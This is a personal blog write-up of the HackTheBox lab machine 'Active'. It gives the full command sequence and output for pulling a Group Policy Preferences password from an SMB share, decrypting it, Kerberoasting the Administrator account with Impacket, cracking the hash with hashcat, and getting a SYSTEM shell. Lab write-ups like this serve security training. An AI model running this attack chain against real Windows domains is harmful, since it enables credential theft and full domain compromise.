---
title: "HackTheBox Writeup: Active"
date: 2019-10-10T23:45:07+02:00
showdate: true
toc: true
tags:
  - hackthebox
  - ctf
  - writeup
---

This is the box that introduced me to Kerberos attacks so I owe it quite a lot, as this category of techniques is incredibly useful even if unfortunately rarely used in CTF's, they're definitely precious lessons for real life engagements.

Obtaining user is pretty straight forward if you have already went through a local Windows enumeration checklist a few times, it involves finding a GPP encrypted password from a groups.xml file to then escalate privileges through Kerberoasting, which I was completely new to, and that I found very interesting.

Something odd about this box is that as you can see from the image, the yellow border indicates a Medium difficulty, while the rating is still at Easy and thus solving this box only grants you 20 points. I don't know if it's an error or what else. I think this box is a good learning experience for those dipping their toes in Windows security.

![img](/images/writeup-active/1.png)

---

## Drawing the perimeter

Open ports and services:

```aaa
C:\Users\Giulio\Desktop\htb\active
λ nmap -sC -sV -oA nmap 10.10.10.100
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-16 19:38 ora legale Europa occidentale
Nmap scan report for 10.10.10.100
Host is up (0.016s latency).
Not shown: 983 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2019-09-16 17:38:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -41s, deviation: 0s, median: -41s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2019-09-16 19:38:58
|_  start_date: 2019-09-16 18:59:32

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.38 seconds
```

I got quite a few different services: DNS, LDAP, Kerberos, SMB, WinRPC... the sort of services you'd expect to see in a Windows Domain Controller. The only service I can interact with as of now is SMB, for which this time I have decided to use Impacket's smbclient Python script to interact with (which I have discovered by mistake still believing I was on Linux and could use the *other* smbclient):

```aaa
C:\Users\Giulio\Desktop\htb\active
λ smbclient 10.10.10.100                           
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Co

Type help for list of commands                     
# shares                                           
ADMIN$                                             
C$                                                 
IPC$                                               
NETLOGON                                           
Replication                                        
SYSVOL                                             
Users
```

The only share I can access here is Replication, where at first all that can be seen is a bunch of files under weird folder names:

```aaa
# use replication
# ls
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 active.htb
# cd active.htb
# ls
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 DfsrPrivate
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 Policies
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 scripts
# cd scripts                                                                           
# ls                                                                                   
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .                                      
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..                                     
# cd ../policies                                                                       
# ls                                                                                   
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .                                      
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..                                     
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 {31B2F340-016D-11D2-945F-00C04FB984F9}
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 {6AC1786C-016F-11D2-945F-00C04fB984F9}
# cd ../DfsrPrivate                                                                    
# ls                                                                                   
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .                                      
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..                                     
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ConflictAndDeleted                     
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 Deleted                                
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 Installing                             
```

The thing is, that Policies directory is actually very interesting: the name of the share, "replication", is a hint on what this really is, a replica of the SYSVOL share. SYSVOL is a domain-wide share available to all authenticated users with read access, it contains login scripts and group policy data among other things.

One of the files an attacker is the most interested in when exploring this share is of course the Groups.xml file, which is stored in this absolute directory:

```aaa
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

Translate it to the network location we are currently in and we obtain:

```aaa
\\10.10.10.100\Replication\active.htb\Policies\
```
The layout of the path matches perfectly just by replacing the name of the share with its clone, SYSVOL is not accessible by guest users / NULL sessions. Anyway, the Groups.xml file is used by Windows [Group Policy Preferences](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)) to store credentials which are then used to perform several administration tasks such as creating scheduled tasks and managing users, so in essence, they contain juicy passwords. Let's go and grab that file to take a closer look:

```aaa
# pwd
\active.htb\policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\preferences\groups
# ls
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 .
drw-rw-rw-          0  Sat Jul 21 12:37:44 2018 ..
-rw-rw-rw-        533  Sat Jul 21 12:38:11 2018 Groups.xml
# get Groups.xml
#
```

This is how the XML file looks like:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"
name="active.htb\SVC_TGS"
image="2"
changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
<Properties action="U"
newName=""
fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
changeLogon="0"
noChange="1"
neverExpires="1"
acctDisabled="0"
userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```

The *cpassword* field contains the encrypted password belonging to the SVC_TGS account, which is a Kerberos account, since it stands for "Service Ticket-Granting Service", but more on this later. The password is encrypted with AES-256, which is pretty good... or it would be, if the encryption key [wasn't made public by Microsoft themselves](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be):

![img](/images/writeup-active/2.png)

---

## Becoming user: decrypting Group Policy Preferences (GPP) passwords

Considering that any authenticated user in the domain has access to this easily decryptable file it is obvious how big of a security concern this is, luckily if your Windows domain hosts are updated Microsoft has released [updates to mitigate this issue](https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati) and make sure passwords are no longer saved in the Groups.xml file.

Anyway, back to the password, *the gpp-decrypt* utility included in Kali can do the job very quickly and easily:

```aaa
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

If you're on Windows and have Empire you can use its Get-DecryptedCPassword function, alternatively [this](https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py) very nice little Python script from Leonteale can work too:

```aaa
C:\Users\Giulio\Desktop\htb\active
λ c:\Python27\python.exe Gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

This gives me a nice pair of credentials:

```aaa
User: SVC_TGS
Pass: GPPstillStandingStrong2k18
```

With which I can access the Users share that was first protected, to grab the first flag:

```aaa
c:\Users\Giulio\Desktop\htb\active                                          
λ smbclient active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100      
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation                
                                                                            
Type help for list of commands                                              
# shares                                                                    
ADMIN$                                                                      
C$                                                                          
IPC$                                                                        
NETLOGON                                                                    
Replication                                                                 
SYSVOL                                                                      
Users                                                                       
# use users                                                                 
# ls                                                                        
drw-rw-rw-          0  Sat Jul 21 16:39:20 2018 .                           
drw-rw-rw-          0  Sat Jul 21 16:39:20 2018 ..                          
drw-rw-rw-          0  Mon Jul 16 12:14:21 2018 Administrator               
drw-rw-rw-          0  Mon Jul 16 23:08:56 2018 All Users                   
drw-rw-rw-          0  Mon Jul 16 23:08:47 2018 Default                     
drw-rw-rw-          0  Mon Jul 16 23:08:56 2018 Default User                
-rw-rw-rw-        174  Mon Jul 16 23:01:17 2018 desktop.ini                 
drw-rw-rw-          0  Mon Jul 16 23:08:47 2018 Public                      
drw-rw-rw-          0  Sat Jul 21 17:16:32 2018 SVC_TGS                     
# cd SVC_TGS                                                                
# cd desktop                                                                
# ls                                                                        
drw-rw-rw-          0  Sat Jul 21 17:14:42 2018 .                           
drw-rw-rw-          0  Sat Jul 21 17:14:42 2018 ..                          
-rw-rw-rw-         34  Sat Jul 21 17:14:42 2018 user.txt                    
# get user.txt                                                              
#                                                                           
```

Now, since when I did this box I was a complete beginner to Kerberos attacks I was quite confused at first, there doesn't appear to be much to interact with our credentials other than SMB, where there are no interesting files or anything. The solution to this issue resides in an attack called *Kerberoasting*, which allows us to obtain NTLM hashes from Kerberos Ticket Granting Services (TGS) which we can then crack.

---

## Launching the Kerberoasting attack

We can link our current situation to Kerberoasting thanks to the username of our account, *SVC_TGS*. There are different ways to launch this attack, most of which require a low privilege shell on the target system, which we do not have, but luckily one of Impacket's tools, *GetUserSPNs*, allows us to gather a list of valid Service Principal Names (SPN) and look for associated TGS's that contain hashes in them, all while providing only user credentials and interacting with the box through SMB:

```aaa
c:\Tools\impacket-examples-windows
λ GetUserSPNs.exe active.htb/svc_tgs -dc-ip 10.10.10.100 -request
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-07-30 19:17:40

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$15495594345075d5690b62d64cd516c3$8e272f06208e9656e0706b5720c98bc12cb123ad9ff8ad52a6756caa3b54de964f05af1d6946f468c30ac37d81496a1e12cab5ad312e4c491b7ae0ebc8955f577fcc136058e389e8159df6c04fbbc4603858d7774cc0e8331b555939c23cd017df63d1e0f0acd53ff8a2fd2937198eff98f717d0f69a41756541120a09e9f499ff58fa5a89efed565a8812b94c5c9544b67ac3e2d70119966bfd26eb5374407b048bbc061837532e2d96a0e0c9b831059cd0133245969c1f94878bc0230bb77b4eb483dadb87ee587776f8225f71bd36a6b48c8339a9c826625d32b4484c2d600e45f398ed31f5c7c801df693f97580615b20d3ed2d53f910baf7ae9c8b7561a5c1df87a4b338fbb9499047b227db2ad83ad83e6da3998a3555324f5fe8d9b02c060c3b234a8595b33f96eb31d55582ab9ea37fbc9ef6a65fbd361012314d0dd609aa3e4526b49dee3bb398bbb34cde312112ae1f16ef6a9e64a8ee34a4318b38e2c8199dd14f2162a9a0c7df39471e1c256398f38905310db2be19b1ee3400b345c9b6b34f18e9f1615815d414f62cdc0f6c72907d8409e0f045a266ecfe5486fae8699f7ad6600d03f0260ad9c0dbc8c52fb6dd7355175d9edeecfe7d8e7edadf7e18ee667b6e808685e25dd23b3b3f7cc085a5041eef965e3d67317fe671f268fe4915d9519e8ba3798c679361fc1929e0ade2a43faad0bf0affe7a5ec0ff35c8dc7e7c5565df65ec8b1838d3813acbaca3b3b9d91ba5d66f51be05aa3586bbcb7af5ab276fb9ebf007efad8da50a7c4751fbad8f0f73c529a753cdba7e0c4b33f26dc933437ee104777e8b5c5c7804afc5feb2a6145614899cf5d277cdf9f66da82f7155bf0668198f1fc96be39af4da6d7b93e5aa5c17c448297549dbbc892d18860cf24788add30fc1eec6e7ac010441884d10862b81ade6ddecf454f8495124ad23a77ad2fb87d94f7d198ef9de404745d97919b8c5611f8f63742e9d3e87398e584aaab8dc76d291867acbc2eb8dd5ee0649459162c81f126227b58dbd71abd8f8f02f029d1b58843ace2c2d25f799ebddabf9b0065f7223859b14310cfb54aeeca1f42f6b3c421ff816d749d0bd5a26291a67dc697e8f952875c8844385106d2eaadb8188c0ba1d5249e9fc2ec0dd89bf7fc66c651702b4cc744c3042b29571405ece219a0a0c9eb559dd19ed4728dd162c495c4dbaf067052cccfd3f4ec6ae6a1e39764b7a360b5dcb5d22bdc12428e07e45f21001
```

The *-request* flag is used to display found hashes in a format compatible with programs like hashcat. A Kerberos Ticket-Granting Service (TGS) hash was returned, for the Administrator user. I copied it into a file and launched hashcat in 13100 mode (Kerberos 5 TGS-REP etype 23) to crack it using a dictionary attack with the usual massive rockyou.txt wordlist.

After only a few seconds the password is found:

```aaa
c:\Users\Giulio\Desktop\hashcat-5.1.0
λ hashcat64.exe -m 13100 -a 0 ..\htb\active\hash.txt ..\..\Downloads\rockyou.txt --force
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 550 Ti, 256/1024 MB allocatable, 4MCU

OpenCL Platform #2: Intel(R) Corporation
========================================
* Device #2: Intel(R) Core(TM) i7 CPU         960  @ 3.20GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

[CUT OUTPUT]

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$15495594345075d5690b62d64cd516c3$8e272f06208e9656e0706b5720c98bc12cb123ad9ff8ad52a6756caa3b54de964f05af1d6946f468c30ac37d81496a1e12cab5ad312e4c491b7ae0ebc8955f577fcc136058e389e8159df6c04fbbc4603858d7774cc0e8331b555939c23cd017df63d1e0f0acd53ff8a2fd2937198eff98f717d0f69a41756541120a09e9f499ff58fa5a89efed565a8812b94c5c9544b67ac3e2d70119966bfd26eb5374407b048bbc061837532e2d96a0e0c9b831059cd0133245969c1f94878bc0230bb77b4eb483dadb87ee587776f8225f71bd36a6b48c8339a9c826625d32b4484c2d600e45f398ed31f5c7c801df693f97580615b20d3ed2d53f910baf7ae9c8b7561a5c1df87a4b338fbb9499047b227db2ad83ad83e6da3998a3555324f5fe8d9b02c060c3b234a8595b33f96eb31d55582ab9ea37fbc9ef6a65fbd361012314d0dd609aa3e4526b49dee3bb398bbb34cde312112ae1f16ef6a9e64a8ee34a4318b38e2c8199dd14f2162a9a0c7df39471e1c256398f38905310db2be19b1ee3400b345c9b6b34f18e9f1615815d414f62cdc0f6c72907d8409e0f045a266ecfe5486fae8699f7ad6600d03f0260ad9c0dbc8c52fb6dd7355175d9edeecfe7d8e7edadf7e18ee667b6e808685e25dd23b3b3f7cc085a5041eef965e3d67317fe671f268fe4915d9519e8ba3798c679361fc1929e0ade2a43faad0bf0affe7a5ec0ff35c8dc7e7c5565df65ec8b1838d3813acbaca3b3b9d91ba5d66f51be05aa3586bbcb7af5ab276fb9ebf007efad8da50a7c4751fbad8f0f73c529a753cdba7e0c4b33f26dc933437ee104777e8b5c5c7804afc5feb2a6145614899cf5d277cdf9f66da82f7155bf0668198f1fc96be39af4da6d7b93e5aa5c17c448297549dbbc892d18860cf24788add30fc1eec6e7ac010441884d10862b81ade6ddecf454f8495124ad23a77ad2fb87d94f7d198ef9de404745d97919b8c5611f8f63742e9d3e87398e584aaab8dc76d291867acbc2eb8dd5ee0649459162c81f126227b58dbd71abd8f8f02f029d1b58843ace2c2d25f799ebddabf9b0065f7223859b14310cfb54aeeca1f42f6b3c421ff816d749d0bd5a26291a67dc697e8f952875c8844385106d2eaadb8188c0ba1d5249e9fc2ec0dd89bf7fc66c651702b4cc744c3042b29571405ece219a0a0c9eb559dd19ed4728dd162c495c4dbaf067052cccfd3f4ec6ae6a1e39764b7a360b5dcb5d22bdc12428e07e45f21001:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...f21001
Time.Started.....: Tue Sep 17 17:20:00 2019 (12 secs)
Time.Estimated...: Tue Sep 17 17:20:12 2019 (0 secs)
Guess.Base.......: File (..\..\Downloads\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   923.0 kH/s (7.47ms) @ Accel:64 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10551296/14344384 (73.56%)
Rejected.........: 0/10551296 (0.00%)
Restore.Point....: 10534912/14344384 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tiona172 -> TUGGAB8
Hardware.Mon.#1..: Temp: 51c Fan: 41%

Started: Tue Sep 17 17:19:47 2019
Stopped: Tue Sep 17 17:20:13 2019
```

The second pair of credentials is now in my hands:

```aaa
User: Administrator
Pass: Ticketmaster1968
```

---

## From Administrator credentials to SYSTEM shell: psexec, wmiexec, atexec

And with these I obtained a SYSTEM shell with Impacket's PSExec script (for some reason the original wouldn't work):

![img](/images/writeup-active/3.png)

I remember doing this last step with wmiexec from Kali the first time, but the Windows binary doesn't seem to work properly, and neither does atexec.exe, as both seem to hang forever. This is only a Windows issue though, both work just fine on Linux and can be used the same way PSExec is used.